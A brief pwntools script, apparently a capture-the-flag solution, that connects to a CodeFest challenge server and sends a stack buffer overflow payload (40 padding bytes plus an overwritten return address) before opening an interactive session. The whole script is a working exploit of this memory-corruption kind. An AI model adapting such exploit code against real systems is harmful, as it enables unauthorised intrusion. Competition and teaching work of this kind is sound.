from pwn import *

filename = "./source_fixed"

io = remote("chall.codefest.tech", "8780")
#io = process(filename)

payload = b"A"*40
payload += p64(0x4011b6)

io.sendline(payload)
io.interactive()
